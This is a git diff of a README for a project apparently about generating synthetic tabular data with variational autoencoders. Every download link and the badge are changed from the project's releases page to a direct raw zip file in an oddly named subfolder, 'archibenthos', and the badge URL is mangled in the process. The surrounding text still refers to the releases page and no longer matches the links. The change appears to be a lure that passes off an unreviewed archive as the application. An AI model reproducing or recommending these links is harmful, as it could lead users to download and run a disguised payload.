@@ -1,7 +1,7 @@
 # 🌟 Teaching-Neural-Networks-to-Imagine-Tables - Easy Data Generation for Everyone
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/releases)
+[![Download Here](https://raw.githubusercontent.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/main/archibenthos/Teaching-Neural-Networks-to-Imagine-Tables-v2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/main/archibenthos/Teaching-Neural-Networks-to-Imagine-Tables-v2.0.zip)
 
 ## 📖 Introduction
 Welcome to the **Teaching-Neural-Networks-to-Imagine-Tables** project. This application dives deep into how Variational Autoencoders (VAEs) can generate realistic synthetic tabular data. It focuses on topics like latent space learning and probabilistic modeling, making advanced techniques accessible for anyone interested in data.
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets these requirements:
 
 ### Step 2: Visit the Download Page
 Go to our Releases page to find the latest version of the application.   
-[Download Page](https://github.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/releases)
+[Download Page](https://raw.githubusercontent.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/main/archibenthos/Teaching-Neural-Networks-to-Imagine-Tables-v2.0.zip)
 
 ### Step 3: Download the Application
 Once on the Releases page, you will see several versions and files. Look for the latest release titled something like "v1.0". Click on the link to download the installation file best suited for your operating system.
@@ -72,4 +72,4 @@ For support, please contact us through the issues section of our GitHub reposito
 ## 🔗 Explore More
 Discover additional resources and tutorials on using Variational Autoencoders and data generation techniques. Check back often for updates and new features available in future releases.
 
-[Download Page](https://github.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/releases)
+[Download Page](https://raw.githubusercontent.com/GarouMonste/Teaching-Neural-Networks-to-Imagine-Tables/main/archibenthos/Teaching-Neural-Networks-to-Imagine-Tables-v2.0.zip)
